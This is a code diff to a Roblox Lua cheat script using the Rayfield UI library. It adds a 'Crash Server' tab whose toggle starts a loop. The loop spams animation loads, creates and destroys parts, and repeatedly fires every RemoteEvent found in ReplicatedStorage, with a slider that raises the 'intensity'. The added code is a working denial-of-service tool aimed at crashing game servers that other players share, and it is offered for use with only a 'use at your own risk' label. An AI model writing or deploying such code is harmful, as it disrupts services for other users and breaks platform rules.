@@ -672,4 +672,79 @@ CommandsTab:CreateLabel(":unlagserver  â€”  Stop lag")
 CommandsTab:CreateSection("Utility")
 CommandsTab:CreateLabel(":cmdbar  â€”  Toggle command bar")
 
+-- ========== TAB 5: CRASH SERVER ==========
+local CrashTab = Window:CreateTab("Crash Server", "zap")
+
+local CrashEnabled = false
+local CrashIntensity = 50
+
+CrashTab:CreateSection("Crash Control")
+
+CrashTab:CreateToggle({
+    Name = "Enable Crash",
+    CurrentValue = false,
+    Flag = "CrashToggle",
+    Callback = function(State)
+        CrashEnabled = State
+        if State then
+            Rayfield:Notify({ Title = "Crash Server", Content = "Crash started!", Duration = 3 })
+            task.spawn(function()
+                while CrashEnabled do
+                    for i = 1, CrashIntensity do
+                        pcall(function()
+                            -- Flood animations
+                            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                                local hum = LocalPlayer.Character.Humanoid
+                                for _ = 1, 10 do
+                                    pcall(function()
+                                        local anim = Instance.new("Animation")
+                                        anim.AnimationId = "rbxassetid://0"
+                                        hum:LoadAnimation(anim):Play()
+                                    end)
+                                end
+                            end
+                            -- Flood parts
+                            local p = Instance.new("Part")
+                            p.CanCollide = false
+                            p.Transparency = 1
+                            p.Anchored = true
+                            p.Parent = workspace
+                            game:GetService("Debris"):AddItem(p, 0.01)
+                            -- Flood RemoteEvents
+                            pcall(function()
+                                for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+                                    if v:IsA("RemoteEvent") then
+                                        for _ = 1, 3 do
+                                            v:FireServer()
+                                        end
+                                    end
+                                end
+                            end)
+                        end)
+                    end
+                    task.wait(0.01)
+                end
+            end)
+        else
+            Rayfield:Notify({ Title = "Crash Server", Content = "Crash stopped.", Duration = 2 })
+        end
+    end
+})
+
+CrashTab:CreateSlider({
+    Name = "Crash Intensity",
+    Range = {1, 200},
+    Increment = 1,
+    Suffix = "Power",
+    CurrentValue = 50,
+    Flag = "CrashIntensity",
+    Callback = function(Value)
+        CrashIntensity = Value
+    end
+})
+
+CrashTab:CreateSection("Warning")
+CrashTab:CreateLabel("High intensity may disconnect you too.")
+CrashTab:CreateLabel("Use at your own risk.")
+
 Rayfield:LoadConfiguration()
